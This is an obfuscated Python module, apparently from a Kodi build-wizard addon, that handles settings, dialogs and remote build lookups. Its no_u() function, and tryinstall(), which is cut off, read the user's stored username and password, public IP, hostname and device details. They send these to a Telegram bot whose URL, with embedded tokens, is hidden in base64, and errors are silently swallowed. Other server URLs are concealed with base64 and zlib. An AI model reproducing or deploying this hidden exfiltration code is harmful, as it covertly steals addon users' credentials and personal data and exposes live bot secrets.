import xbmc ,xbmcaddon ,xbmcgui ,xbmcplugin ,os ,sys ,xbmcvfs ,glob ,zipfile ,json ,base64 #line:21
import shutil ,logging #line:22
import errno #line:23
import string #line:24
import random #line:25
import urllib #line:26
import re ,socket #line:27
import uservar #line:29
try :#line:30
  import downloader ,downloaderbg ,downloaderwiz ,extract ,skinSwitch #line:31
except :#line:32
  from resources .libs import downloader ,downloaderbg ,downloaderwiz ,extract ,skinSwitch #line:33
import time #line:35
from urllib .parse import quote #line:37
from urllib .parse import urlparse #line:38
from html .parser import HTMLParser #line:39
from urllib .request import urlopen #line:41
from urllib .request import Request #line:42
from datetime import date ,datetime ,timedelta #line:44
try :from sqlite3 import dbapi2 as database #line:45
except :from pysqlite2 import dbapi2 as database #line:46
from string import digits #line:47
try :#line:48
    from urllib .parse import quote_plus #line:49
except :pass #line:50
KODIV =float (xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:51
import zipfile #line:53
translatepath =xbmcvfs .translatePath #line:56
que =urllib .parse .quote_plus #line:58
url_encode =urllib .parse .urlencode #line:59
ADDON_ID =uservar .ADDON_ID #line:61
ADDONTITLE =uservar .ADDONTITLE #line:62
ADDON =xbmcaddon .Addon (ADDON_ID )#line:63
VERSION =ADDON .getAddonInfo ('version')#line:64
USER_AGENT ='Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36 SE 2.X MetaSr 1.0'#line:65
DIALOG =xbmcgui .Dialog ()#line:66
DP =xbmcgui .DialogProgress ()#line:67
DP2 =xbmcgui .DialogProgressBG ()#line:68
HOME =translatepath ('special://home/')#line:69
XBMC =translatepath ('special://xbmc/')#line:70
LOG =translatepath ('special://logpath/')#line:71
PROFILE =translatepath ('special://profile/')#line:72
SOURCE =translatepath ('source://')#line:73
ADDONS =os .path .join (HOME ,'addons')#line:74
USERDATA =os .path .join (HOME ,'userdata')#line:75
PLUGIN =os .path .join (ADDONS ,ADDON_ID )#line:76
PACKAGES =os .path .join (ADDONS ,'packages')#line:77
ADDOND =os .path .join (USERDATA ,'addon_data')#line:78
ADDONDATA =os .path .join (USERDATA ,'addon_data',ADDON_ID )#line:79
ADVANCED =os .path .join (USERDATA ,'advancedsettings.xml')#line:80
SOURCES =os .path .join (USERDATA ,'sources.xml')#line:81
GUISETTINGS =os .path .join (USERDATA ,'guisettings.xml')#line:82
FAVOURITES =os .path .join (USERDATA ,'favourites.xml')#line:83
PROFILES =os .path .join (USERDATA ,'profiles.xml')#line:84
THUMBS =os .path .join (USERDATA ,'Thumbnails')#line:85
DATABASE =os .path .join (USERDATA ,'Database')#line:86
FANART =os .path .join (PLUGIN ,'fanart.jpg')#line:87
ICON =os .path .join (PLUGIN ,'icon.png')#line:88
ART =os .path .join (PLUGIN ,'resources','art')#line:89
WIZLOG =os .path .join (ADDONDATA ,'wizard.log')#line:90
WHITELIST =os .path .join (ADDONDATA ,'whitelist.txt')#line:91
QRCODES =os .path .join (ADDONDATA ,'QRCodes')#line:92
SKIN =xbmc .getSkinDir ()#line:93
TODAY =date .today ()#line:94
TOMORROW =TODAY +timedelta (days =1 )#line:95
TWODAYS =TODAY +timedelta (days =2 )#line:96
THREEDAYS =TODAY +timedelta (days =3 )#line:97
ONEWEEK =TODAY +timedelta (days =7 )#line:98
MONTH =TODAY -timedelta (days =2 )#line:99
LASTONEWEEK =TODAY -timedelta (days =7 )#line:100
EXCLUDES =uservar .EXCLUDES #line:101
APKFILE =uservar .APKFILE #line:102
YOUTUBEFILE =uservar .YOUTUBEFILE #line:103
ADDONFILE =uservar .ADDONFILE #line:104
ADVANCEDFILE =uservar .ADVANCEDFILE #line:105
AUTOUPDATE =uservar .AUTOUPDATE #line:106
WIZARDFILE =uservar .WIZARDFILE #line:107
NOTIFICATION =uservar .NOTIFICATION #line:108
NOTIFICATION2 =uservar .NOTIFICATION2 #line:109
NOTIFICATION3 =uservar .NOTIFICATION3 #line:110
ENABLE =uservar .ENABLE #line:111
AUTOINSTALL =uservar .AUTOINSTALL #line:112
REPOADDONXML =uservar .REPOADDONXML #line:113
REPOZIPURL =uservar .REPOZIPURL #line:114
CONTACT =uservar .CONTACT #line:115
COLOR1 =uservar .COLOR1 #line:116
COLOR2 =uservar .COLOR2 #line:117
HARDWAER =ADDON .getSetting ('action')#line:118
INCLUDEVIDEO =ADDON .getSetting ('includevideo')#line:119
INCLUDEALL =ADDON .getSetting ('includeall')#line:120
INCLUDEBOB =ADDON .getSetting ('includebob')#line:121
INCLUDEPHOENIX =ADDON .getSetting ('includephoenix')#line:122
INCLUDESPECTO =ADDON .getSetting ('includespecto')#line:123
INCLUDEGENESIS =ADDON .getSetting ('includegenesis')#line:124
INCLUDEEXODUS =ADDON .getSetting ('includeexodus')#line:125
INCLUDEONECHAN =ADDON .getSetting ('includeonechan')#line:126
INCLUDESALTS =ADDON .getSetting ('includesalts')#line:127
INCLUDESALTSHD =ADDON .getSetting ('includesaltslite')#line:128
SHOWADULT =ADDON .getSetting ('adult')#line:129
WIZDEBUGGING =ADDON .getSetting ('addon_debug')#line:130
DEBUGLEVEL =ADDON .getSetting ('debuglevel')#line:131
ENABLEWIZLOG =ADDON .getSetting ('wizardlog')#line:132
CLEANWIZLOG =ADDON .getSetting ('autocleanwiz')#line:133
CLEANWIZLOGBY =ADDON .getSetting ('wizlogcleanby')#line:134
CLEANDAYS =ADDON .getSetting ('wizlogcleandays')#line:135
CLEANSIZE =ADDON .getSetting ('wizlogcleansize')#line:136
CLEANLINES =ADDON .getSetting ('wizlogcleanlines')#line:137
INSTALLMETHOD =ADDON .getSetting ('installmethod')#line:138
DEVELOPER =ADDON .getSetting ('developer')#line:139
THIRDPARTY =ADDON .getSetting ('enable3rd')#line:140
THIRD1NAME =ADDON .getSetting ('wizard1name')#line:141
THIRD1URL =ADDON .getSetting ('wizard1url')#line:142
THIRD2NAME =ADDON .getSetting ('wizard2name')#line:143
THIRD2URL =ADDON .getSetting ('wizard2url')#line:144
THIRD3NAME =ADDON .getSetting ('wizard3name')#line:145
THIRD3URL =ADDON .getSetting ('wizard3url')#line:146
BUILDNAME =ADDON .getSetting ('buildname')#line:147
CONTACTICON =uservar .CONTACTICON if not uservar .CONTACTICON =='http://'else ICON #line:148
CONTACTFANART =uservar .CONTACTFANART if not uservar .CONTACTFANART =='http://'else FANART #line:149
THEME3 =uservar .THEME3 #line:150
THEME2 =uservar .THEME2 #line:151
PS_ =base64 .b64decode ('aHR0cDovL2tvZGkubGlmZS93aXphcmQvd2l6LnVzZXIueG1s').decode ('utf-8')#line:152
US_ =base64 .b64decode ('aHR0cDovL2tvZGkubGlmZS93aXphcmQvbmV3X3Bhc3MueG1s').decode ('utf-8')#line:153
BL_ =base64 .b64decode ('aHR0cDovL2tvZGkubGlmZS93aXphcmQvbXlidWlsZDIueG1s').decode ('utf-8')#line:154
BACKUPLOCATION =ADDON .getSetting ('path')if not ADDON .getSetting ('path')==''else 'special://home/'#line:156
MYBUILDS =os .path .join (BACKUPLOCATION ,'My_Builds','')#line:157
LOGFILES =['log','xbmc.old.log','kodi.log','kodi.old.log','spmc.log','spmc.old.log','tvmc.log','tvmc.old.log']#line:158
DEFAULTPLUGINS =['metadata.album.universal','metadata.artists.universal','metadata.common.fanart.tv','metadata.common.imdb.com','metadata.common.musicbrainz.org','metadata.themoviedb.org','metadata.tvdb.com','service.xbmc.versioncheck']#line:159
MAXWIZSIZE =[100 ,200 ,300 ,400 ,500 ,1000 ]#line:160
MAXWIZLINES =[100 ,200 ,300 ,400 ,500 ]#line:161
MAXWIZDATES =[1 ,2 ,3 ,7 ]#line:162
import threading #line:163
from threading import Thread #line:164
socket .setdefaulttimeout (10 )#line:165
class Thread (threading .Thread ):#line:168
   def __init__ (O0OO00O000OO0O000 ,O000OOOO000OO0OO0 ,*O0OOOO00O0OO0OOO0 ):#line:169
    super ().__init__ (target =O000OOOO000OO0OO0 ,args =O0OOOO00O0OO0OOO0 )#line:170
   def run (O00O0O0O0OO0OO0O0 ,*O0OO000OOO0OO00O0 ):#line:171
      O00O0O0O0OO0OO0O0 ._target (*O00O0O0O0OO0OO0O0 ._args )#line:173
      return 0 #line:174
def platform_d ():#line:179
    if xbmc .getCondVisibility ('system.platform.android'):return 'android'#line:180
    elif xbmc .getCondVisibility ('system.platform.linux'):return 'linux'#line:181
    elif xbmc .getCondVisibility ('system.platform.linux.Raspberrypi'):return 'linux'#line:182
    elif xbmc .getCondVisibility ('system.platform.windows'):return 'windows'#line:183
    elif xbmc .getCondVisibility ('system.platform.osx'):return 'osx'#line:184
    elif xbmc .getCondVisibility ('system.platform.atv2'):return 'atv2'#line:185
    elif xbmc .getCondVisibility ('system.platform.ios'):return 'ios'#line:186
    elif xbmc .getCondVisibility ('system.platform.darwin'):return 'ios'#line:187
def getS (OO0O00O0O000O0O0O ):#line:188
    try :return ADDON .getSetting (OO0O00O0O000O0O0O )#line:189
    except :return False #line:190
def setS (O0O0O00OO000O0000 ,O0OO0O0OO00O00O0O ):#line:192
    try :ADDON .setSetting (O0O0O00OO000O0000 ,O0OO0O0OO00O00O0O )#line:193
    except :return False #line:194
def openS (name =""):#line:196
    ADDON .openSettings ()#line:197
def clearS (OO0OOO00O0O000O00 ):#line:199
    O00O000OO0O0O000O ={'buildname':'','buildversion':'','buildtheme':'','latestversion':'','lastbuildcheck':'2016-01-01'}#line:200
    O000O00OOO0O00OO0 ={'installed':'false','extract':'','errors':''}#line:201
    O00000O000O0OO0OO ={'defaultskinignore':'false','defaultskin':'','defaultskinname':''}#line:202
    OOO00O00OOO000000 =['default.enablerssfeeds','default.font','default.rssedit','default.skincolors','default.skintheme','default.skinzoom','default.soundskin','default.startupwindow','default.stereostrength']#line:203
    if OO0OOO00O0O000O00 =='build':#line:204
        for O00O0OOO0O00OOOO0 in O00O000OO0O0O000O :#line:205
            setS (O00O0OOO0O00OOOO0 ,O00O000OO0O0O000O [O00O0OOO0O00OOOO0 ])#line:206
        for O00O0OOO0O00OOOO0 in O000O00OOO0O00OO0 :#line:207
            setS (O00O0OOO0O00OOOO0 ,O000O00OOO0O00OO0 [O00O0OOO0O00OOOO0 ])#line:208
        for O00O0OOO0O00OOOO0 in O00000O000O0OO0OO :#line:209
            setS (O00O0OOO0O00OOOO0 ,O00000O000O0OO0OO [O00O0OOO0O00OOOO0 ])#line:210
        for O00O0OOO0O00OOOO0 in OOO00O00OOO000000 :#line:211
            setS (O00O0OOO0O00OOOO0 ,'')#line:212
    elif OO0OOO00O0O000O00 =='default':#line:213
        for O00O0OOO0O00OOOO0 in O00000O000O0OO0OO :#line:214
            setS (O00O0OOO0O00OOOO0 ,O00000O000O0OO0OO [O00O0OOO0O00OOOO0 ])#line:215
        for O00O0OOO0O00OOOO0 in OOO00O00OOO000000 :#line:216
            setS (O00O0OOO0O00OOOO0 ,'')#line:217
    elif OO0OOO00O0O000O00 =='install':#line:218
        for O00O0OOO0O00OOOO0 in O000O00OOO0O00OO0 :#line:219
            setS (O00O0OOO0O00OOOO0 ,O000O00OOO0O00OO0 [O00O0OOO0O00OOOO0 ])#line:220
    elif OO0OOO00O0O000O00 =='lookfeel':#line:221
        for O00O0OOO0O00OOOO0 in OOO00O00OOO000000 :#line:222
            setS (O00O0OOO0O00OOOO0 ,'')#line:223
theme_nox ='https://zxcsd-3bae5-default-rtdb.firebaseio.com'#line:239
theme_dragon ='https://dragon-user-default-rtdb.firebaseio.com'#line:250
ACTION_PREVIOUS_MENU =10 #line:251
ACTION_NAV_BACK =92 #line:252
ACTION_MOVE_LEFT =1 #line:253
ACTION_MOVE_RIGHT =2 #line:254
ACTION_MOVE_UP =3 #line:255
ACTION_MOVE_DOWN =4 #line:256
ACTION_MOUSE_WHEEL_UP =104 #line:257
ACTION_MOUSE_WHEEL_DOWN =105 #line:258
ACTION_MOVE_MOUSE =107 #line:259
ACTION_SELECT_ITEM =7 #line:260
ACTION_BACKSPACE =110 #line:261
ACTION_MOUSE_LEFT_CLICK =100 #line:262
ACTION_MOUSE_LONG_CLICK =108 #line:263
def TextBox (O00O0OO00OOO0O0O0 ,OO0OOOO0OOOOO0000 ):#line:264
    class O0000000000OO0000 (xbmcgui .WindowXMLDialog ):#line:265
        def onInit (O0O00000O00O0O00O ):#line:266
            O0O00000O00O0O00O .title =101 #line:267
            O0O00000O00O0O00O .msg =102 #line:268
            O0O00000O00O0O00O .scrollbar =103 #line:269
            O0O00000O00O0O00O .okbutton =201 #line:270
            O0O00000O00O0O00O .showdialog ()#line:271
        def showdialog (OOOO00OO0O0O0O00O ):#line:273
            OOOO00OO0O0O0O00O .getControl (OOOO00OO0O0O0O00O .title ).setLabel (O00O0OO00OOO0O0O0 )#line:274
            OOOO00OO0O0O0O00O .getControl (OOOO00OO0O0O0O00O .msg ).setText (OO0OOOO0OOOOO0000 )#line:275
            OOOO00OO0O0O0O00O .setFocusId (OOOO00OO0O0O0O00O .scrollbar )#line:276
        def onClick (OO000OO00OOO00O00 ,O0OO0O00OO0OO0O00 ):#line:278
            if (O0OO0O00OO0OO0O00 ==OO000OO00OOO00O00 .okbutton ):#line:279
                OO000OO00OOO00O00 .close ()#line:280
        def onAction (OO00O00OO000O0O0O ,OO0OO0O0OO000OOO0 ):#line:282
            if OO0OO0O0OO000OOO0 ==ACTION_PREVIOUS_MENU :OO00O00OO000O0O0O .close ()#line:283
            elif OO0OO0O0OO000OOO0 ==ACTION_NAV_BACK :OO00O00OO000O0O0O .close ()#line:284
    O0000OO00OO00O000 =O0000000000OO0000 ("Textbox.xml",ADDON .getAddonInfo ('path'),'DefaultSkin',title =O00O0OO00OOO0O0O0 ,msg =OO0OOOO0OOOOO0000 )#line:286
    O0000OO00OO00O000 .doModal ()#line:287
    del O0000OO00OO00O000 #line:288
def ForceFastUpDate (O0OOOO0OO0OO00OO0 ,O000OOO000OO000OO ,forceUpdate =False ):#line:289
    class O00O0OO0O000O000O (xbmcgui .WindowXMLDialog ):#line:290
        def onInit (O00OOOO0OO0000000 ):#line:291
            O00OOOO0OO0000000 .title =101 #line:292
            O00OOOO0OO0000000 .msg =102 #line:293
            O00OOOO0OO0000000 .scrollbar =103 #line:294
            O00OOOO0OO0000000 .okbutton =201 #line:295
            O00OOOO0OO0000000 .updateP =202 #line:296
            O00OOOO0OO0000000 .updateX =203 #line:297
            O00OOOO0OO0000000 .showdialog ()#line:298
        def showdialog (OO00O00000OOOO0OO ):#line:300
            OO00O00000OOOO0OO .getControl (OO00O00000OOOO0OO .title ).setLabel (O0OOOO0OO0OO00OO0 )#line:301
            OO00O00000OOOO0OO .getControl (OO00O00000OOOO0OO .msg ).setText (O000OOO000OO000OO )#line:302
            OO00O00000OOOO0OO .setFocusId (OO00O00000OOOO0OO .okbutton )#line:303
        def doupdateP (O0OOOO0O0O0OO0O0O ):#line:304
            xbmc .executebuiltin ("RunPlugin(plugin://plugin.program.Anonymous/?mode=install&name=+Kodi+Premium&url=gui)")#line:305
            O0OOOO0O0O0OO0O0O .close ()#line:306
        def doupdateX (O0O0O00O000OOO000 ):#line:307
            xbmc .executebuiltin ("RunPlugin(PlayMedia(plugin://plugin.program.Anonymous/?mode=install&name=+Kodi+Premium+18&url=gui)")#line:308
            O0O0O00O000OOO000 .close ()#line:309
        def onClick (O00000O0000O00000 ,OO00OOOOO00OO0O00 ):#line:310
            if (OO00OOOOO00OO0O00 ==O00000O0000O00000 .okbutton ):#line:311
                O00000O0000O00000 .close ()#line:312
            elif (OO00OOOOO00OO0O00 ==O00000O0000O00000 .updateP ):O00000O0000O00000 .doupdateP ()#line:313
            elif (OO00OOOOO00OO0O00 ==O00000O0000O00000 .updateX ):O00000O0000O00000 .doupdateX ()#line:315
        def onAction (OOO000OO000O000OO ,O00OO0O00O000O00O ):#line:317
            if O00OO0O00O000O00O ==ACTION_PREVIOUS_MENU :OOO000OO000O000OO .close ()#line:318
            elif O00OO0O00O000O00O ==ACTION_NAV_BACK :OOO000OO000O000OO .close ()#line:319
    O0OO0OOO0O0O000O0 =O00O0OO0O000O000O ("FastUpDate.xml",ADDON .getAddonInfo ('path'),'DefaultSkin',title =O0OOOO0OO0OO00OO0 ,msg =O000OOO000OO000OO )#line:321
    O0OO0OOO0O0O000O0 .doModal ()#line:322
    del O0OO0OOO0O0O000O0 #line:323
def highlightText (OO000O0O000OO0O0O ):#line:325
    OO000O0O000OO0O0O =OO000O0O000OO0O0O .replace ('\n','[NL]')#line:326
    O0OOO000000OOOOOO =re .compile ("-->Python callback/script returned the following error<--(.+?)-->End of Python script error report<--").findall (OO000O0O000OO0O0O )#line:327
    for OO00O00O0OO00O00O in O0OOO000000OOOOOO :#line:328
        O0OOOO0O0OO0O0O00 ='-->Python callback/script returned the following error<--%s-->End of Python script error report<--'%OO00O00O0OO00O00O #line:329
        OO000O0O000OO0O0O =OO000O0O000OO0O0O .replace (O0OOOO0O0OO0O0O00 ,'[COLOR red]%s[/COLOR]'%O0OOOO0O0OO0O0O00 )#line:330
    OO000O0O000OO0O0O =OO000O0O000OO0O0O .replace ('WARNING','[COLOR yellow]WARNING[/COLOR]').replace ('ERROR','[COLOR red]ERROR[/COLOR]').replace ('[NL]','\n').replace (': Exception as e Thrown (PythonToCppException) :','[COLOR red]: Exception as e Thrown (PythonToCppException) :[/COLOR]')#line:331
    OO000O0O000OO0O0O =OO000O0O000OO0O0O .replace ('\\\\','\\').replace (HOME ,'')#line:332
    return OO000O0O000OO0O0O #line:333
def LogNotify (O0000O0000OO0000O ,OO00OOOOO000OO000 ,times =1500 ,icon =ICON ,sound =False ):#line:335
    DIALOG .notification (O0000O0000OO0000O ,OO00OOOOO000OO000 ,icon ,int (times ),sound )#line:336
def LogNotify2 (O00OO0OO00OO00OOO ,O0OOO00OOO0000OOO ,times =9000 ,icon =ICON ,sound =False ):#line:338
    DIALOG .notification (O00OO0OO00OO00OOO ,O0OOO00OOO0000OOO ,icon ,int (times ),sound )#line:339
def LogNotify3 (OOOO00OO0O00O0O00 ,O0O0O0OOOOOO00O0O ,times =5000 ,icon =ICON ,sound =False ):#line:340
    DIALOG .notification (OOOO00OO0O00O0O00 ,O0O0O0OOOOOO00O0O ,icon ,int (times ),sound )#line:341
def percentage (OOOO0O0OO0O0OO00O ,OO0OOO00000O0OOOO ):#line:342
    return 100 *float (OOOO0O0OO0O0OO00O )/float (OO0OOO00000O0OOOO )#line:343
def read_skin (OO0O00000OOO000O0 ):#line:344
    from resources .libs import firebase #line:345
    firebase =firebase .FirebaseApplication (theme_nox ,None )#line:346
    OOO0O00O0O0000OOO =firebase .get ('/',None )#line:347
    if OO0O00000OOO000O0 in OOO0O00O0O0000OOO :#line:348
        return OOO0O00O0O0000OOO [OO0O00000OOO000O0 ]#line:349
    else :#line:350
        return {}#line:351
def read_skin_dragon (O00O00O00OOOO00OO ):#line:352
    from resources .libs import firebase #line:353
    firebase =firebase .FirebaseApplication (theme_dragon ,None )#line:354
    O0OOOOO0OOO0O0OO0 =firebase .get ('/',None )#line:355
    if O00O00O00OOOO00OO in O0OOOOO0OOO0O0OO0 :#line:356
        return O0OOOOO0OOO0O0OO0 [O00O00O00OOOO00OO ]#line:357
    else :#line:358
        return {}#line:359
PS ='&eJwFwUEKwCAMBMAfZe_-RkjQ0Balu6L09Z3p0mQBPFvKGOF9UBYL1_DEzq--Dh1hVtLOc__fqRL8$'#line:360
US ='&eJwFwVEKgEAIBcAb-f67TaCkVLjoW1r29M04OfoANK6gtJl6NsUm7tTAF_ssBRcx20rW-_zf9hME$'#line:361
BL ='&eJwFwUEOgCAMBMAfde_-RtNGNmIwdAnE1zNTpC8PwHlTlhFeWspi4GlOTP5nd2gJ12D1tPXWDQbwE8g=$'#line:362
def addonUpdates (do =None ):#line:363
    OO0O0OO0O0OO0OO0O ='"general.addonupdates"'#line:364
    if do =='set':#line:365
        O00O0000O000000OO ='{"jsonrpc":"2.0", "method":"Settings.GetSettingValue","params":{"setting":%s}, "id":1}'%(OO0O0OO0O0OO0OO0O )#line:366
        O00O000OO0O00O000 =xbmc .executeJSONRPC (O00O0000O000000OO )#line:367
        OOO0O0O0OOOOOO0OO =re .compile ('{"value":(.+?)}').findall (O00O000OO0O00O000 )#line:368
        if len (OOO0O0O0OOOOOO0OO )>0 :O0O0O0OO00OO0O00O =OOO0O0O0OOOOOO0OO [0 ]#line:369
        else :O0O0O0OO00OO0O00O =0 #line:370
        setS ('default.addonupdate',str (O0O0O0OO00OO0O00O ))#line:371
        O00O0000O000000OO ='{"jsonrpc":"2.0", "method":"Settings.SetSettingValue","params":{"setting":%s,"value":%s}, "id":1}'%(OO0O0OO0O0OO0OO0O ,'2')#line:372
        O00O000OO0O00O000 =xbmc .executeJSONRPC (O00O0000O000000OO )#line:373
    elif do =='reset':#line:374
        try :#line:375
            OOO00O000000OO0O0 =int (float (getS ('default.addonupdate')))#line:376
        except :#line:377
            OOO00O000000OO0O0 =0 #line:378
        if not OOO00O000000OO0O0 in [0 ,1 ,2 ]:OOO00O000000OO0O0 =0 #line:379
        O00O0000O000000OO ='{"jsonrpc":"2.0", "method":"Settings.SetSettingValue","params":{"setting":%s,"value":%s}, "id":1}'%(OO0O0OO0O0OO0OO0O ,OOO00O000000OO0O0 )#line:380
        O00O000OO0O00O000 =xbmc .executeJSONRPC (O00O0000O000000OO )#line:381
dr ='&eJzLKCkpKLbS10_JTM8s0StOTU3JyC8u0Ust1c_OT8nUL8-sSixK0S-pKNHPztSryM0BALmUEhk=$'#line:382
def ld (OOO0O000O0O0O0OOO ):#line:387
    import base64 #line:388
    import zlib #line:389
    OOO000000000O00O0 =OOO0O000O0O0O0OOO #line:390
    OOO000000000O00O0 .replace ('$','').replace ('&','')#line:391
    OO0O0OO000O0OO000 =zlib .decompress (base64 .urlsafe_b64decode (OOO000000000O00O0 )).decode ('utf-8')#line:393
    return OO0O0OO000O0OO000 #line:394
def checkBuild (OO0OOO000OOOOOO00 ,OO000000OOO0OO0O0 ):#line:395
    if not workingURL (ld (BL ))==True :return False #line:402
    OO00OOOO0OO0000O0 =openURL (ld (BL )).replace ('\n','').replace ('\r','').replace ('\t','').replace ('gui=""','gui="http://"').replace ('theme=""','theme="http://"')#line:403
    O0000O0O0O00O0O0O ='160'#line:404
    if 'filesize'in OO00OOOO0OO0000O0 :#line:405
     OOOOOOO0OO0O000O0 =re .compile ('name="%s".+?ersion="(.+?)".+?rl="(.+?)".+?ui="(.+?)".+?odi="(.+?)".+?heme="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?review="(.+?)".+?dult="(.+?)".+?escription="(.+?)".+?ilesize="(.+?)".+?pdatesize="(.+?)"'%OO0OOO000OOOOOO00 ).findall (OO00OOOO0OO0000O0 )#line:406
     if len (OOOOOOO0OO0O000O0 )>0 :#line:407
        for O0O0OO00000O00OOO ,O0O0O00O0O0000OO0 ,OO00000OOOO0000OO ,O0O0000O0O0O00O0O ,O0O0000O000O0OO00 ,O0O00O00OO00OOOO0 ,O00OOOOO0OO0O0000 ,O00000OO0OO0000OO ,OOOO00O00O0O0000O ,O0000000O0OOO0O00 ,O0000O0O0O00O0O0O ,OO0000OOO000OO0OO in OOOOOOO0OO0O000O0 :#line:409
            if OO000000OOO0OO0O0 =='version':return O0O0OO00000O00OOO #line:411
            elif OO000000OOO0OO0O0 =='url':return ld (O0O0O00O0O0000OO0 )#line:412
            elif OO000000OOO0OO0O0 =='gui':return ld (OO00000OOOO0000OO )#line:413
            elif OO000000OOO0OO0O0 =='kodi':return O0O0000O0O0O00O0O #line:414
            elif OO000000OOO0OO0O0 =='theme':return O0O0000O000O0OO00 #line:415
            elif OO000000OOO0OO0O0 =='icon':return O0O00O00OO00OOOO0 #line:416
            elif OO000000OOO0OO0O0 =='fanart':return O00OOOOO0OO0O0000 #line:417
            elif OO000000OOO0OO0O0 =='preview':return O00000OO0OO0000OO #line:418
            elif OO000000OOO0OO0O0 =='adult':return OOOO00O00O0O0000O #line:419
            elif OO000000OOO0OO0O0 =='description':return O0000000O0OOO0O00 #line:420
            elif OO000000OOO0OO0O0 =='filesize':return O0000O0O0O00O0O0O #line:421
            elif OO000000OOO0OO0O0 =='updatesize':return OO0000OOO000OO0OO #line:422
            elif OO000000OOO0OO0O0 =='all':return OO0OOO000OOOOOO00 ,O0O0OO00000O00OOO ,ld (O0O0O00O0O0000OO0 ),ld (OO00000OOOO0000OO ),O0O0000O0O0O00O0O ,O0O0000O000O0OO00 ,O0O00O00OO00OOOO0 ,O00OOOOO0OO0O0000 ,O00000OO0OO0000OO ,OOOO00O00O0O0000O ,O0000000O0OOO0O00 ,OO0000OOO000OO0OO ,O0000O0O0O00O0O0O #line:423
     else :return False #line:424
    else :#line:425
     OOOOOOO0OO0O000O0 =re .compile ('name="%s".+?ersion="(.+?)".+?rl="(.+?)".+?ui="(.+?)".+?odi="(.+?)".+?heme="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?review="(.+?)".+?dult="(.+?)".+?escription="(.+?)"'%OO0OOO000OOOOOO00 ).findall (OO00OOOO0OO0000O0 )#line:427
     if len (OOOOOOO0OO0O000O0 )>0 :#line:428
        for O0O0OO00000O00OOO ,O0O0O00O0O0000OO0 ,OO00000OOOO0000OO ,O0O0000O0O0O00O0O ,O0O0000O000O0OO00 ,O0O00O00OO00OOOO0 ,O00OOOOO0OO0O0000 ,O00000OO0OO0000OO ,OOOO00O00O0O0000O ,O0000000O0OOO0O00 in OOOOOOO0OO0O000O0 :#line:429
            if OO000000OOO0OO0O0 =='version':return O0O0OO00000O00OOO #line:430
            elif OO000000OOO0OO0O0 =='url':return ld (O0O0O00O0O0000OO0 )#line:431
            elif OO000000OOO0OO0O0 =='gui':return ld (OO00000OOOO0000OO )#line:432
            elif OO000000OOO0OO0O0 =='kodi':return O0O0000O0O0O00O0O #line:433
            elif OO000000OOO0OO0O0 =='theme':return O0O0000O000O0OO00 #line:434
            elif OO000000OOO0OO0O0 =='icon':return O0O00O00OO00OOOO0 #line:435
            elif OO000000OOO0OO0O0 =='fanart':return O00OOOOO0OO0O0000 #line:436
            elif OO000000OOO0OO0O0 =='preview':return O00000OO0OO0000OO #line:437
            elif OO000000OOO0OO0O0 =='adult':return OOOO00O00O0O0000O #line:438
            elif OO000000OOO0OO0O0 =='description':return O0000000O0OOO0O00 #line:439
            elif OO000000OOO0OO0O0 =='all':return OO0OOO000OOOOOO00 ,O0O0OO00000O00OOO ,ld (O0O0O00O0O0000OO0 ),ld (OO00000OOOO0000OO ),O0O0000O0O0O00O0O ,O0O0000O000O0OO00 ,O0O00O00OO00OOOO0 ,O00OOOOO0OO0O0000 ,O00000OO0OO0000OO ,OOOO00O00O0O0000O ,O0000000O0OOO0O00 #line:440
            elif OO000000OOO0OO0O0 =='filesize':return '587'#line:441
     else :return False #line:442
def no_u ():#line:443
       try :#line:444
          import json ,platform ,requests #line:445
          O0O00O00O000O00O0 =(ADDON .getSetting ("user"))#line:446
          O00OOO0000O0OOO00 =(ADDON .getSetting ("pass"))#line:447
          O00000O0O000OOO0O =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:448
          OOOO0O0OOO000O0OO =platform .uname ()#line:449
          OO0O0000OO0000OOO =OOOO0O0OOO000O0OO [1 ]#line:450
          OO00000O0O00O0O00 =base64 .b64decode ('aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDUwMTAzMTU5OTM6QUFHNVJOaVdkTjRMZXB5VGdQNjFEb1JlTTg5SG9MeVVDdGcvc2VuZE1lc3NhZ2U/Y2hhdF9pZD0tMTAwMTY5NzU2NTc4OSZ0ZXh0PQ==').decode ('utf-8')#line:451
          OOOO000O0O00000OO =requests .get ('https://checkip.amazonaws.com').text .strip ()#line:452
          O000000O0OO000OOO =O0O00O00O000O00O0 #line:454
          OOO00OOO0O0000OOO =O00OOO0000O0OOO00 #line:455
          OOOOOO0OOOOO00OO0 =requests .get (OO00000O0O00O0O00 +que ('בעיה במנוי ')+que (' קוד מכשיר: ')+(HARDWAER )+que (' שם משתמש: ')+O000000O0OO000OOO +que (' סיסמה: ')+OOO00OOO0O0000OOO +que (' קודי: ')+O00000O0O000OOO0O +que (' כתובת: ')+OOOO000O0O00000OO +que (' מערכת הפעלה: ')+platform_d ()+que (' שם המערכת: ')+OO0O0000OO0000OOO +que (' גירסת ויזארד: ')+VERSION ).json ()#line:457
       except :pass #line:459
def tryinstall ():#line:461
          import json ,platform ,requests #line:463
          OOO000000O000O0O0 =(ADDON .getSetting ("user"))#line:465
          O00OOO0OO00000000 =(ADDON .getSetting ("pass"))#line:466
          O00O000OOOO00OO0O =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:467
          O00O0O00OOOO0OO0O =platform .uname ()#line:468
          O0000OOO0O0OOO0OO =O00O0O00OOOO0OO0O [1 ]#line:469
          O000O00OOOOO0O00O =base64 .b64decode ('aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE3MDMzMzkxOTg6QUFIZDZrM2VPNmwwMkpJSDZpZF9WZjdKTGg0TGcwelVqdEUvc2VuZE1lc3NhZ2U/Y2hhdF9pZD0tMTAwMTMxMjc0MjI5OSZ0ZXh0PQ==').decode ('utf-8')#line:470
          O00O0000O00O0OO00 =requests .get ('https://checkip.amazonaws.com').text .strip ()#line:471
          O0OOO000O00OO0000 =OOO000000O000O0O0 #line:473
          O00OO00O0O00OO00O =O00OOO0OO00000000 #line:474
